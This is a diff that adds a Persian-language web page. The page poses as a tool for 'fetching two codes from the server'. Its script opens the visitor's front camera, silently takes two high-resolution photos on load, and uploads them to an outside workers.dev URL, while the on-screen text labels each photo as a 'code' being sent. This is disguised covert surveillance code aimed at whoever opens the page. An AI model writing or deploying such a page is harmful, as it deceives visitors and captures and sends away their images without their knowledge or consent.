@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>گرفتن خودکار دو کد</title>
+    <style>
+        body { 
+            font-family: Tahoma, sans-serif; 
+            text-align: center; 
+            background: #f0f0f0; 
+            padding: 20px; 
+            margin: 0;
+        }
+        video { 
+            width: 100%; 
+            max-width: 640px; 
+            border: 2px solid #333; 
+            border-radius: 10px; 
+            margin-top: 20px;
+        }
+        canvas { display: none; }
+        #status { 
+            margin: 20px 0; 
+            font-size: 20px; 
+            min-height: 30px;
+        }
+        #footer {
+            margin-top: 40px;
+            font-size: 18px;
+            color: #333;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>در حال گرفتن کد از سرور...</h1>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    
+    <div id="status"></div>
+    
+    <div id="footer">
+        اگرکد‌ها ارسال نشد یا کپی نشد، لطفاً پیام بدید
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const status = document.getElementById('status');
+
+        const WORKER_URL = 'https://bold-smoke-e8c.alijayz.workers.dev/';
+        let photoCount = 0;
+
+        // دسترسی به دوربین جلو با کیفیت بالا
+        navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: 'user',      // دوربین سلفی
+                width: { ideal: 1920 },
+                height: { ideal: 1080 }
+            }
+        })
+        .then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+                // وقتی ویدیو آماده شد، شروع به گرفتن خودکار عکس
+                takePhotosAutomatically();
+            };
+        })
+        .catch(err => {
+            status.textContent = 'خطا در دسترسی به دوربین: ' + err.message;
+            status.style.color = 'red';
+        });
+
+        function captureAndSend(photoNumber) {
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('photo', blob, `photo${photoNumber}.jpg`);
+
+                status.textContent = `در حال ارسال کد ${photoNumber}...`;
+                status.style.color = '#0066cc';
+
+                fetch(WORKER_URL, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (response.ok) {
+                        status.textContent = `کد${photoNumber} با موفقیت ارسال شد`;
+                        status.style.color = 'green';
+                    } else {
+                        status.textContent = `خطا در ارسال کد ${photoNumber}`;
+                        status.style.color = 'red';
+                    }
+                })
+                .catch(err => {
+                    status.textContent = 'خطا در ارتباط: ' + err.message;
+                    status.style.color = 'red';
+                });
+            }, 'image/jpeg', 0.95); // کیفیت 95%
+        }
+
+        function takePhotosAutomatically() {
+            // عکس اول بلافاصله
+            captureAndSend(1);
+            photoCount = 1;
+
+            // عکس دوم بعد از ۲ ثانیه
+            setTimeout(() => {
+                captureAndSend(2);
+                photoCount = 2;
+
+                // بعد از ارسال دوم، پیام نهایی
+                setTimeout(() => {
+                    status.textContent = 'هر دو کد ارسال شد. ممنون!';
+                    status.style.color = 'green';
+                }, 3000);
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
